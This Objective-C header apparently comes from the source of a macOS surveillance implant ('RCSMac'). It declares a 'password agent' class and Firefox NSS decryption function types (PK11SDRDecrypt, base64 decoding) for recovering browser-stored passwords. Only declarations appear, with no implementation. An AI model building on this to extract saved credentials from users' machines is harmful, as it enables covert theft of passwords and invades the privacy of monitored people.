/*
 * RCSMAgentPassword.h
 * RCSMac
 * Password Agent
 *
 *
 * Created by J on 06/03/2014
 * Copyright (C) HT srl 2014. All rights reserved
 *
 */

// also based on
// https://chromium.googlesource.com/chromium/src/+/lkgr/chrome/utility/importer/nss_decryptor_mac.h


#ifndef __RCSMAgentPassword_h__
#define __RCSMAgentPassword_h__

#import <Foundation/Foundation.h>
#import "RCSMLogManager.h"

// The following declarations of functions and types are from Firefox
// NSS library.
// source code:
// security/nss/lib/util/seccomon.h
// security/nss/lib/nss/nss.h
// The license block is: [...]

typedef enum SECItemType {
    siBuffer = 0,
    siClearDataBuffer = 1,
    siCipherDataBuffer = 2,
    siDERCertBuffer = 3,
    siEncodedCertBuffer = 4,
    siDERNameBuffer = 5,
    siEncodedNameBuffer = 6,
    siAsciiNameString = 7,
    siAsciiString = 8,
    siDEROID = 9,
    siUnsignedInteger = 10,
    siUTCTime = 11,
    siGeneralizedTime = 12
} SECItemType;

typedef struct SECItem {
    SECItemType type;
    unsigned char *data;
    unsigned int len;
} SECItem;

typedef enum SECStatus {
    SECWouldBlock = -2,
    SECFailure = -1,
    SECSuccess = 0
} SECStatus;

typedef int PRBool;
#define PR_TRUE 1
#define PR_FALSE 0
typedef enum { PR_FAILURE = -1, PR_SUCCESS = 0 } PRStatus;
typedef struct PK11SlotInfoStr PK11SlotInfo;
typedef struct PLArenaPool      PLArenaPool;

typedef SECStatus (*NSSInitFunc)(const char *configdir);
typedef SECStatus (*NSSShutdownFunc)(void);
typedef SECStatus (*PK11SDRDecryptFunc)(SECItem *data, SECItem *result, void *cx);
typedef void (*SECITEMZfreeItemFunc)(SECItem *item, PRBool free_it);
typedef SECItem *(*NSSBase64_DecodeBufferFunc)(PLArenaPool *, SECItem *, const char *, unsigned int);

// end of NSS declarations

#define MARKUP_KEY @"date"

@interface __m_MAgentPassword : NSObject <__m_Agents>
{
@private
    NSMutableDictionary *mConfiguration;
    NSMutableDictionary *markup;
}

+ (__m_MAgentPassword *)sharedInstance;
- (id)copyWithZone: (NSZone *)aZone;
+ (id)allocWithZone: (NSZone *)aZone;

- (void)release;
- (id)autorelease;
- (id)retain;
- (unsigned)retainCount;

- (NSMutableDictionary *)mConfiguration;
- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;

@end

#endif
